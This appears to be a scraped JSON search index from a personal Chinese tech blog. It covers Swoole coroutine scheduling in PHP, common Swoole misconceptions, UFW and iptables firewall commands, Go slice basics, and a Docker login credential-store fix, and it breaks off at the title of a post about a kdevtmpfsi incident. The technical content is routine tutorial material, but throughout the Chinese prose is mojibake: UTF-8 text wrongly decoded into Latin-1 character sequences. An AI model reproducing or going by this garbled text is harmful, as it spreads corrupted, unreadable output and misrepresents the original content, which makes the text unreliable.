æ‰§è¡Œåˆ°go()éƒ¨åˆ†æ—¶ï¼Œä¼šåœ¨å½“å‰åç¨‹ä¸­åˆ›å»ºä¸€ä¸ªåç¨‹ï¼Œè¾“å‡º1ï¼Œåç¨‹é€€å‡º ä»£ç ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¾“å‡º 2 å†æ¬¡é‡åˆ°go()å‡½æ•°ï¼Œè¾“å‡º3 åç¨‹é€€å‡ºï¼Œè¿›ç¨‹é€€å‡ºï¼Œæ‰§è¡Œå®Œæˆ åç¨‹è°ƒåº¦\\Co::sleep() å‡½æ•°å’Œsleep()å‡½æ•°å·®ä¸å¤šï¼Œä½†æ˜¯å®ƒæ¨¡æ‹Ÿçš„æ˜¯ IO ç­‰å¾…ã€‚ 123456789101112&lt;?phpgo(function () &#123; &#x2F;&#x2F; åªæ–°å¢äº†ä¸€è¡Œä»£ç  Co::sleep(1); echo &quot;1&quot;.PHP_EOL;&#125;);echo &quot;2&quot;.PHP_EOL;go(function () &#123; echo &quot;3&quot;.PHP_EOL;&#125;); æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š 123231 æ€ä¹ˆä¸æ˜¯é¡ºåºæ‰§è¡Œçš„äº†ï¼Ÿå®é™…æ‰§è¡Œè¿‡ç¨‹ï¼š è¿è¡Œä¸Šé¢é‚£æ®µåç¨‹ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªæ–°è¿›ç¨‹ é‡åˆ° go()ï¼Œåœ¨å½“å‰è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªåç¨‹ åç¨‹å‘ä¸‹æ‰§è¡Œé‡åˆ°IO é˜»å¡ï¼Œåç¨‹è®©å‡ºæ§åˆ¶ï¼Œè¿›å…¥åç¨‹è°ƒåº¦é˜Ÿåˆ— è¿›ç¨‹ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¾“å‡º 2 åˆ›å»ºç¬¬äºŒä¸ªåç¨‹ï¼Œè¾“å‡º3 ç¬¬ä¸€ä¸ªåç¨‹å‡†å¤‡å°±ç»ªï¼Œè¾“å‡º 1 åç¨‹é€€å‡ºï¼Œè¿›ç¨‹é€€å‡ºï¼Œæ‰§è¡Œå®Œæˆ åˆ°è¿™é‡Œï¼Œå·²ç»å¯ä»¥çœ‹åˆ°Swoole ä¸­åç¨‹ä¸è¿›ç¨‹çš„å…³ç³»ï¼Œä»¥åŠåç¨‹è°ƒåº¦çš„è¿‡ç¨‹ã€‚ ä¸‹é¢è¿™å¼ å›¾å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°äºŒè€…åŒºåˆ«ä¸è”ç³»ï¼š åç¨‹å¿«åœ¨å“ªé‡Œï¼Ÿå¤§å®¶ä½¿ç”¨åç¨‹ï¼Œå¬åˆ°æœ€å¤šçš„åŸå› ï¼Œå¯èƒ½å°±æ˜¯å› ä¸ºåç¨‹å¿«ã€‚é‚£åç¨‹ç›¸æ¯”ä¼ ç»ŸåŒæ­¥ä»£ç å€’åº•å¿«åœ¨å“ªé‡Œå‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹è®¡ç®—æœºä¸­çš„ä¸¤ç±»ä»»åŠ¡ã€‚ CPUå¯†é›†å‹CPU å¯†é›†å‹ä¹Ÿå«è®¡ç®—å¯†é›†å‹ï¼Œ ç‰¹ç‚¹æ˜¯éœ€è¦è¿›è¡Œå¤§é‡ç§‘å­¦è®¡ç®—ï¼Œæ¯”å¦‚è®¡ç®—åœ†å‘¨ç‡ã€å¯¹è§†é¢‘è¿›è¡Œé«˜æ¸…è§£ç ï¼ŒåƒCPUã€‚ IO å¯†é›†å‹æ¶‰åŠåˆ°ç½‘ç»œã€ç£ç›˜IOçš„ä»»åŠ¡éƒ½æ˜¯IOå¯†é›†å‹ä»»åŠ¡ï¼Œç‰¹ç‚¹æ˜¯ä¸åƒCPUï¼Œä»»åŠ¡çš„å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨ç­‰å¾…IOæ“ä½œå®Œæˆï¼Œå› ä¸ºIOçš„é€Ÿåº¦è¿œè¿œä½äºCPUå’Œå†…å­˜çš„é€Ÿåº¦ã€‚ å…¶æ¬¡éœ€è¦äº†è§£ä¸¤ä¸ªæ¦‚å¿µï¼š å¹¶è¡Œï¼šåŒä¸€æ—¶åˆ»ï¼ŒåŒä¸€CPUåªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡ï¼Œè¦Nä¸ªä»»åŠ¡åŒæ—¶æ‰§è¡Œï¼Œå°±éœ€è¦æœ‰å¤šä¸ªCPU æ‰è¡Œã€‚ å¹¶å‘ï¼šåŒä¸€æ—¶åˆ»æ‰§è¡ŒN ä¸ªä»»åŠ¡ã€‚ç”±äºCPU ä»»åŠ¡åˆ‡æ¢é€Ÿåº¦éå¸¸å¿«ï¼Œå·²ç»å¿«åˆ°äº†äººç±»æ„ŸçŸ¥æé™ã€‚ äº†è§£äº†è¿™äº›åŸºç¡€ä¹‹åï¼Œå¯¹åç¨‹çš„èƒ½åŠ›æ˜¯ä¸æ˜¯ä¹Ÿæ›´æ¸…æ™°äº†ä¸€äº›ï¼Œä»¥åŠåç¨‹ä¸ºä»€ä¹ˆä¼šâ€œå¿«â€äº†ã€‚ å› ä¸ºåç¨‹ä»…åœ¨ IOé˜»å¡ æ—¶æ‰ä¼šè§¦å‘è°ƒåº¦ï¼Œä»è€Œå‡å°‘ç­‰å¾…IO æ“ä½œå®Œæˆçš„æ—¶é—´ã€‚ åç¨‹å®è·µé€šè¿‡å¯¹æ¯”ä¸‹é¢ä¸‰ç§æƒ…å†µï¼ŒåŠ æ·±å¯¹åç¨‹çš„ç†è§£ï¼š åŒæ­¥é˜»å¡ç‰ˆï¼š 1234567&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; sleep(1); echo $i . PHP_EOL;&#125;;echo &quot;ok&quot;; å•ä¸ªåç¨‹ç‰ˆï¼š 123456789&lt;?php$n &#x3D; 4;Co\\Run(function () use ($n) &#123; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; Co::sleep(1); echo $i . PHP_EOL; &#125;;&#125;);echo &quot;ok&quot;; å¤šä¸ªåç¨‹ç‰ˆ1.0ï¼ˆIO å¯†é›†å‹ï¼‰ï¼š 123456789&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; go(function () use ($i) &#123; Co::sleep(1); echo $i . PHP_EOL; &#125;);&#125;;echo &quot;ok&quot;; é€šè¿‡ time å‘½ä»¤åˆ†åˆ«æŸ¥çœ‹è€—æ—¶æ—¶é•¿ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š ä¼ ç»ŸåŒæ­¥é˜»å¡ï¼šé‡åˆ° IOé˜»å¡ï¼Œç­‰å¾…ï¼Œå¯¼è‡´æ€§èƒ½æŸå¤± å•åç¨‹ï¼šå°½ç®¡ IOé˜»å¡å¼•å‘äº†åç¨‹è°ƒåº¦ï¼Œä½†æœ‰ä¸”åªæœ‰ä¸€ä¸ªåç¨‹ å¤šåç¨‹ï¼šé‡åˆ° IOé˜»å¡ æ—¶å‘ç”Ÿè°ƒåº¦ï¼ŒIOå°±ç»ªæ—¶æ¢å¤è¿è¡Œ å¤šä¸ªåç¨‹ç‰ˆ2.0ï¼ˆCPU å¯†é›†å‹ï¼‰ï¼š 12345678910&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; go(function () use ($i) &#123; sleep(1); &#x2F;&#x2F; Co::sleep(1); echo $i . PHP_EOL; &#125;);&#125;;echo &quot;ok&quot;; åªæ˜¯å°† Co::sleep() æ”¹æˆäº† sleep()ï¼Œä¼šå‘ç°æ€»è€—æ—¶æ—¶é•¿åˆå’Œä¼ ç»ŸåŒæ­¥é˜»å¡å·®ä¸å¤šäº†ï¼Œè¿™æ˜¯å› ä¸ºï¼š sleep() å¯ä»¥çœ‹åšæ˜¯ CPUå¯†é›†å‹ä»»åŠ¡, ä¸ä¼šå¼•èµ·åç¨‹çš„è°ƒåº¦ Co::sleep() æ¨¡æ‹Ÿçš„æ˜¯ IOå¯†é›†å‹ä»»åŠ¡, ä¼šå¼•å‘åç¨‹çš„è°ƒåº¦ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ, åç¨‹é€‚åˆ IOå¯†é›†å‹ çš„åº”ç”¨ï¼Œè€Œä¸é€‚åˆ CPU å¯†é›†å‹ä»»åŠ¡ã€‚ å‚è€ƒé“¾æ¥ swoole| swoole åç¨‹åˆä½“éªŒ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole å¸¸è§è¯¯åŒºåŠé—®é¢˜æ€»ç»“","slug":"swoole-common-mistakes-and-problems-summary","date":"2020-12-14T14:12:33.000Z","updated":"2020-12-14T14:13:55.331Z","comments":true,"path":"swoole-common-mistakes-and-problems-summary/","link":"","permalink":"https://www.0x2beace.com/swoole-common-mistakes-and-problems-summary/","excerpt":"éšç€å¯¹Swoole çš„é€æ­¥äº†è§£ï¼Œæ€»ç»“ä»¥ä¸‹å¯èƒ½ä¼šç¢°åˆ°çš„è¯¯åŒºï¼š","text":"éšç€å¯¹Swoole çš„é€æ­¥äº†è§£ï¼Œæ€»ç»“ä»¥ä¸‹å¯èƒ½ä¼šç¢°åˆ°çš„è¯¯åŒºï¼š Swoole æ˜¯å•çº¿ç¨‹ Swoole å¼‚æ­¥å›è°ƒæ¨¡å—ä»…å¯ç”¨äº CLI å‘½ä»¤è¡Œæ¨¡å¼ Swoole åªæœ‰åŒæ­¥é˜»å¡çš„å®¢æˆ·ç«¯æ‰å¯åœ¨ php-fpm ä¸­ä½¿ç”¨ Swoole é‡æ–°ç¼–è¯‘å®‰è£…ä¼šè‡ªåŠ¨è¦†ç›–æ‰ä¹‹å‰çš„ç‰ˆæœ¬ CPUå¯†é›†å‹ä»»åŠ¡ï¼ˆç§‘å­¦è®¡ç®—ç­‰ï¼‰, ä¸ä¼šå¼•èµ·åç¨‹çš„è°ƒåº¦; IOå¯†é›†å‹ä»»åŠ¡ï¼ˆç½‘ç»œè¯·æ±‚, æ–‡ä»¶è¯»å†™ç­‰ï¼‰, æ‰ä¼šå¼•å‘åç¨‹çš„è°ƒåº¦ enable_coroutine å¼€å¯åç¨‹æ”¯æŒä¹‹åï¼Œæ— éœ€ä½¿ç”¨ Co\\Run åˆ›å»ºåç¨‹ æ‰€æœ‰çš„åç¨‹å¿…é¡»åœ¨åç¨‹å®¹å™¨é‡Œé¢åˆ›å»ºï¼ŒSwoole ç¨‹åºå¯åŠ¨çš„æ—¶å€™å¤§éƒ¨åˆ†æƒ…å†µä¼šè‡ªåŠ¨åˆ›å»ºåç¨‹å®¹å™¨ Swoole\\Coroutine å‰ç¼€çš„ç±»åæ˜ å°„ä¸º Coã€‚ä½¿ç”¨ Co\\Run æ–¹æ³•åˆ›å»ºåç¨‹å®¹å™¨ï¼Œä½¿ç”¨ Coroutine::create æˆ– go æ–¹æ³•åˆ›å»ºåç¨‹ã€‚ å¸¸è§é—®é¢˜ï¼š ä»€ä¹ˆæ˜¯åç¨‹å®¹å™¨ï¼Ÿ æ˜¯å¦å¯ä»¥å…±ç”¨ 1 ä¸ª Redis æˆ– MySQL è¿æ¥ Call to undefined function Co\\Run()","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Linux ufw å¿«é€Ÿä¸Šæ‰‹","slug":"linux-ufw-quick-start","date":"2020-12-10T13:54:58.000Z","updated":"2020-12-14T14:15:37.375Z","comments":true,"path":"linux-ufw-quick-start/","link":"","permalink":"https://www.0x2beace.com/linux-ufw-quick-start/","excerpt":"ä¹‹å‰å·²ç»äº†è§£äº† iptables æ˜¯è®¾ç½®é˜²ç«å¢™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä½†å¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œå®ƒçš„ä¸Šæ‰‹æ›²çº¿å¤ªé™¡äº†ã€‚","text":"ä¹‹å‰å·²ç»äº†è§£äº† iptables æ˜¯è®¾ç½®é˜²ç«å¢™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä½†å¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œå®ƒçš„ä¸Šæ‰‹æ›²çº¿å¤ªé™¡äº†ã€‚ UFW ï¼ˆå³ç®€å•é˜²ç«å¢™ï¼‰ç›¸è¾ƒ iptablesï¼Œå¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œåˆ™æ˜“äºä¸Šæ‰‹å¾—å¤šã€‚ UFW é»˜è®¤å®‰è£…åœ¨Ubuntuä¸Šã€‚å¦‚æœç”±äºæŸç§åŸå› å·²å°†å…¶å¸è½½ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š 1$ sudo apt install ufw å¼€å¯ IPV6 123$ sudo vim &#x2F;etc&#x2F;default&#x2F;ufwIPV6&#x3D;yes æŸ¥çœ‹UFWçŠ¶æ€Ubuntu é»˜è®¤æ²¡æœ‰å¼€å¯ UFWã€‚ 1$ sudo ufw status inactiveï¼šè¡¨ç¤ºé˜²ç«å¢™å…³é—­çŠ¶æ€ activeï¼šè¡¨ç¤ºé˜²ç«å¢™å¼€å¯çŠ¶æ€ å¼€å¯UFW123$ sudo ufw enableCommand may disrupt existing ssh connections. Proceed with operation (y|n)? yFirewall is active and enabled on system startup åˆæ¬¡å¼€å¯ UFW æ²¡æœ‰ä»»ä½•è§„åˆ™ï¼ˆå¦‚æœä¹‹å‰å·²ç»æ·»åŠ è¿‡UFW è§„åˆ™ï¼Œåˆ™è¿˜æ˜¯å­˜åœ¨çš„ï¼‰ï¼Œå¦‚éœ€æŸ¥çœ‹ä»¥å¼€å¯å“ªäº›è§„åˆ™ï¼ŒåŒæ ·ä½¿ç”¨ufw statuså‘½ä»¤ã€‚ å…³é—­UFW1$ sudo ufw disable é‡ç½®æ‰€æœ‰è§„åˆ™1$ sudo ufw reset å…è®¸æŒ‡å®šç«¯å£1$ sudo ufw allow http &#x2F;&#x2F; sudo ufw allow 80 æŒ‡å®šç‰¹å®š IPä½¿ç”¨UFWæ—¶ï¼Œè¿˜å¯ä»¥æŒ‡å®šIPåœ°å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¦å…è®¸æ¥è‡ªç‰¹å®šIPåœ°å€çš„è¿æ¥ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw allow from &lt;ip_address&gt; è¿˜å¯ä»¥é€šè¿‡æ·»åŠ to any portç«¯å£å·æ¥æŒ‡å®šå…è®¸IPåœ°å€è¿æ¥çš„ç‰¹å®šç«¯å£ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦å…è®¸ 203.0.113.4 è¿æ¥åˆ°ç«¯å£22ï¼ˆSSHï¼‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw allow from 203.0.113.4 to any port 22 ç¦æ­¢æŒ‡å®šç«¯å£1$ sudo ufw deny https &#x2F;&#x2F; sudo ufw deny 443 åˆ é™¤æŒ‡å®šè§„åˆ™æ­£å¼åˆ é™¤å…·ä½“è§„åˆ™ä¹‹å‰ï¼Œå…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å¯¹åº”ç¼–å·ï¼š 1$ sudo ufw status numbered åˆ é™¤æŒ‡å®šç¼–å·å¯¹åº”çš„è§„åˆ™ï¼š 1$ sudo ufw delete &lt;id&gt; æ£€æŸ¥UFWçŠ¶æ€å’Œè§„åˆ™1$ sudo ufw status verbose é‡æ–°è½½å…¥é…ç½®1$ sudo ufw reload æ³¨æ„äº‹é¡¹âš ï¸ï¼š ä¿®æ”¹äº†æŸæ¡è§„åˆ™ä¹‹åï¼Œéœ€è¦è®©UFW é‡æ–°åŠ è½½é…ç½®ï¼Œè®¾å®šè§„åˆ™æ‰ä¼šç”Ÿæ•ˆã€‚ è°¨æ…ç¦ç”¨ sshï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´è‡ªå·±ä¹Ÿè¿æ¥ä¸ä¸Šã€‚ åœ¨å¯ç”¨ UFW ä¹‹å‰ï¼Œæœ€å¥½æ£€æŸ¥æˆ–è€…é‡ç½®ä¸€ä¸‹è§„åˆ™ã€‚ å‚è€ƒé“¾æ¥ How To Set Up a Firewall with UFW on Ubuntu 18.04 åœ¨ Ubuntu ä¸­ç”¨ UFW é…ç½®é˜²ç«å¢™","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"UFW","slug":"UFW","permalink":"https://www.0x2beace.com/tags/UFW/"}]},{"title":"Linux iptables å¸¸ç”¨è§„åˆ™æ•´ç†","slug":"linux-iptables-common-rules-collation","date":"2020-12-09T13:19:00.000Z","updated":"2020-12-10T13:56:03.338Z","comments":true,"path":"linux-iptables-common-rules-collation/","link":"","permalink":"https://www.0x2beace.com/linux-iptables-common-rules-collation/","excerpt":"å› ä¸ºæ‰‹ä¸Šä¸€ç›´ç®¡ç†ç€ä¸¤å°å®ä½“æœºï¼ˆæœåŠ¡å™¨ï¼‰ï¼Œè€Œå®ä½“æœºçš„æ˜¯æ²¡æœ‰â€œè½¯é˜²â€è¿™ä¸ªæ¦‚å¿µçš„ï¼Œâ€œç¡¬é˜²â€è§„åˆ™åªèƒ½è‡ªå·±å»è®¾å®šã€‚","text":"å› ä¸ºæ‰‹ä¸Šä¸€ç›´ç®¡ç†ç€ä¸¤å°å®ä½“æœºï¼ˆæœåŠ¡å™¨ï¼‰ï¼Œè€Œå®ä½“æœºçš„æ˜¯æ²¡æœ‰â€œè½¯é˜²â€è¿™ä¸ªæ¦‚å¿µçš„ï¼Œâ€œç¡¬é˜²â€è§„åˆ™åªèƒ½è‡ªå·±å»è®¾å®šã€‚ è€ŒLinux åŸå§‹çš„é˜²ç«å¢™å·¥å…·iptables è¿‡äºç¹çï¼Œä¸Šæ‰‹æ›²çº¿è¾ƒé™¡ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°å°±ç”¨æ¥æ•´ç† Linux çš„ iptables ç›¸å…³çŸ¥è¯†ã€‚ iptables æ˜¯ä»€ä¹ˆæˆ‘ä»¬å¸¸å¸¸ä¼šå¬åˆ°è¿™æ ·çš„è¯´æ³•ï¼šâ€œiptables æ˜¯ä¸€ä¸ªé˜²ç«å¢™â€ï¼Œå…¶å®ä¸æ˜¯ï¼Œå®ƒä¹Ÿä¸æ˜¯ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨/åœæ­¢/é‡å¯ã€‚ 1systemctl start&#x2F;stop&#x2F;restart iptables iptables å…¶å®åªæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒç”¨æ¥æ“ä½œ netfilter å†…æ ¸é˜²ç«å¢™ï¼Œæ‰€ä»¥çœŸæ­£åº”ç”¨çš„é˜²ç«å¢™åº”è¯¥æ˜¯netfilterã€‚ å½“æ‹¿åˆ°ä¸€å°Linux åï¼Œiptableså°±åœ¨é‚£é‡Œï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒå…è®¸æ‰€æœ‰æµé‡ã€‚ 123456789$ sudo iptables -LChain INPUT (policy ACCEPT)target prot opt source destination Chain FORWARD (policy ACCEPT)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination å…è®¸ç‰¹å®šç«¯å£è®¿é—®è®¿é—®è¿‡ç¨‹å¦‚ä¸‹ï¼š å°†æ­¤è§„åˆ™é™„åŠ åˆ°è¾“å…¥é“¾ï¼ˆ-A INPUTï¼‰ï¼Œä»¥ä¾¿æŸ¥çœ‹ä¼ å…¥æµé‡ æ£€æŸ¥æ˜¯å¦ä¸ºTCPï¼ˆ-p tcpï¼‰ å¦‚æœæ˜¯ï¼Œæ£€æŸ¥è¾“å…¥æ˜¯å¦è¿›å…¥ç«¯å£ï¼ˆâ€“dport sshï¼‰ å¦‚æœæ˜¯ï¼Œæ¥å—è¾“å…¥ï¼ˆ-j ACCEPTï¼‰ 1234iptables -A INPUT -p tcp --dport 22 -j ACCEPT # å…è®¸è®¿é—®22ç«¯å£iptables -A INPUT -p tcp --dport 80 -j ACCEPT # å…è®¸è®¿é—®80ç«¯å£iptables -A INPUT -p tcp --dport 443 -j ACCEPT # å…è®¸è®¿é—®443ç«¯å£iptables -A FORWARD -j REJECT # ç¦æ­¢å…¶ä»–æœªå…è®¸çš„è§„åˆ™è®¿é—® ç¦æ­¢ç‰¹å®šç«¯å£è®¿é—®1iptables -A INPUT -p tcp --dport 6379 -j DROP # ç¦æ­¢6379ç«¯å£ä¼ å…¥æµé‡ å¦‚æœæƒ³è¦å±è”½UDPæµé‡è€Œä¸æ˜¯TCPæµé‡ï¼Œåªéœ€å°†ä¸Šè¿°è§„åˆ™ä¸­çš„ tcp ä¿®æ”¹ä¸º udp å³å¯ã€‚ ç¦ç”¨é˜²ç«å¢™å¦‚æœéœ€è¦ä¸´æ—¶/æ°¸ä¹…ç¦ç”¨iptables é˜²ç«å¢™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¸…é™¤æ‰€æœ‰è§„åˆ™ï¼š 1234sudo iptables -P INPUT ACCEPTsudo iptables -P OUTPUT ACCEPTsudo iptables -P FORWARD ACCEPTsudo iptables -F è®¾ç½®å®Œæˆä¹‹åï¼Œä¸ç”¨é‡å¯ä»»ä½•æœåŠ¡ï¼Œå…¶é˜²ç«å¢™è§„åˆ™å·²ç»åˆ·æ–°äº†ï¼ˆå…è®¸æ‰€æœ‰æµé‡ï¼‰ã€‚ å‚è€ƒé“¾æ¥ 25 ä¸ªæœ‰ç”¨çš„ iptables é˜²ç«å¢™è§„åˆ™ å¦‚ä½•åœ¨Ubuntuä¸Šå¯åŠ¨/åœæ­¢iptablesï¼Ÿ IptablesHowTo iptables - Linux","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"iptables","slug":"iptables","permalink":"https://www.0x2beace.com/tags/iptables/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°","slug":"golang-quick-start","date":"2020-12-08T15:53:16.000Z","updated":"2020-12-09T00:16:20.213Z","comments":true,"path":"golang-quick-start/","link":"","permalink":"https://www.0x2beace.com/golang-quick-start/","excerpt":"æœ€è¿‘å¼€å§‹å­¦ä¹ Go è¯­è¨€ï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ ç¬”è®°ï¼Œå…·ä½“å¯ä»¥è®¿é—®Go è¯­è¨€å­¦ä¹ ç¬”è®°","text":"æœ€è¿‘å¼€å§‹å­¦ä¹ Go è¯­è¨€ï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ ç¬”è®°ï¼Œå…·ä½“å¯ä»¥è®¿é—®Go è¯­è¨€å­¦ä¹ ç¬”è®° åˆ‡ç‰‡slice çš„æœ¬è´¨æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå®ç°äº†å¯¹æ•°ç»„æ“ä½œçš„å°è£…ã€‚ go æä¾›äº†ä¸€ç§ç±»ä¼¼â€œåŠ¨æ€æ•°ç»„â€ç»“æ„çš„æ•°æ®ç±»å‹ï¼Œè¿™ç§ç±»å‹å°±æ˜¯åˆ‡ç‰‡ã€‚ å£°æ˜ 12345&#x2F;&#x2F; è¯­æ³•var identifier []type&#x2F;&#x2F; å£°æ˜ä¸€ä¸ªä¸º int64 ç±»å‹çš„åˆ‡ç‰‡ var slice []int64 åˆå§‹åŒ–ï¼š 12345&#x2F;&#x2F; åˆå§‹åŒ–ä¸€ä¸ª int64 ç±»å‹çš„åˆ‡ç‰‡array &#x3D; make ([]int64, 10)&#x2F;&#x2F; åˆå§‹åŒ–æ•°ç»„array &#x3D; [10] int64 &#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125; åˆ‡ç‰‡å¸¸è§æ“ä½œå¯¹å…ƒç´ è¿›è¡Œæ·»åŠ ï¼š 12 æ•°ç»„å’Œåˆ‡ç‰‡å­˜åœ¨ä¸€äº›åŒºåˆ«ï¼š å£°æ˜æ•°ç»„æ—¶ï¼Œæ˜¯éœ€è¦æŒ‡å®šé•¿åº¦ï¼Œè€Œåˆ‡ç‰‡ä¸ç”¨æŒ‡å®šé•¿åº¦ã€‚ åˆå§‹åŒ–æ“ä½œä¸ä¸€æ ·ã€‚","categories":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"}]},{"title":"Docker Login ç™»å½•å¼‚å¸¸","slug":"docker-Login-login-exception","date":"2020-12-06T14:51:20.000Z","updated":"2020-12-06T14:58:27.671Z","comments":true,"path":"docker-Login-login-exception/","link":"","permalink":"https://www.0x2beace.com/docker-Login-login-exception/","excerpt":"ä»Šå¤©åˆšå¥½æœ‰ç©ºï¼ŒæŠŠå‰å¤©é‚£ä¸ªè¢«æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„å®¹å™¨ç»™æ¢ä¸€æ¢ã€‚","text":"ä»Šå¤©åˆšå¥½æœ‰ç©ºï¼ŒæŠŠå‰å¤©é‚£ä¸ªè¢«æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„å®¹å™¨ç»™æ¢ä¸€æ¢ã€‚ é—®é¢˜æè¿°ä½¿ç”¨ docker login ç™»å½•æ—¶ï¼Œæ€»æ˜¯ä¼šæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼Œå¯æ˜¯æˆ‘æ˜æ˜è¾“å…¥çš„æ˜¯æ­£ç¡®çš„è´¦å·å¯†ç ã€‚ 1Error saving credentials: error storing credentials - err: exit status 1, out: Cannot autolaunch D-Bus without X11 $DISPLAY å› ä¸ºæˆ‘ä½¿ç”¨çš„å¹¶ä¸æ˜¯æœ€æ–°çš„ docker-ce ç‰ˆï¼Œè€Œæ˜¯è€ç‰ˆæœ¬docker.ioï¼Œæ‰€ä»¥èµ·åˆæˆ‘æ˜¯æ€€ç–‘ç‰ˆæœ¬å‡ºç°äº†ä¸å…¼å®¹çš„é—®é¢˜å—ï¼Ÿ å…¶å®ä¸æ˜¯ï¼Œè¿™æ˜¯åœ¨ Ubuntu ä¸‹ä½¿ç”¨ docker ç‰¹æœ‰çš„ bug ï¼Œè€Œä¿®å¤åŠæ³•ä¸éœ€è¦ç‰¹æ„å»å¸è½½ docker-compose ï¼Œåªè¦ â€œpassâ€ æ‰éªŒè¯æ­¥éª¤ã€‚ é—®é¢˜è§£å†³æœ€ç»ˆè§£å†³æ­¥éª¤å¦‚ä¸‹ï¼š 1. å®‰è£… gnupg2 å’Œ pass1sudo apt install gnupg2 pass 2. ç”Ÿæˆå¯†é’¥1$ gpg2 --full-generate-key 3. æŸ¥çœ‹å¯†é’¥æ‰€åœ¨è·¯å¾„1$ gpg2 -k 4. ä½¿ç”¨ pass åŠ è½½éªŒè¯1$ pass init &quot;your key location path&quot; è‡³æ­¤å°±å·²ç»pass æ‰äº†éªŒè¯æ­¥éª¤ï¼Œå¯ä»¥ä½¿ç”¨ docker login æ­£å¸¸ç™»å½•äº†ã€‚ å‚è€ƒé“¾æ¥ Docker login æŠ¥è¯ä¹¦å­˜å‚¨é”™è¯¯çš„è§£å†³åŠæ³•","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"è®°ä¸€æ¬¡æœåŠ¡å™¨è¢« kdevtmpfsi 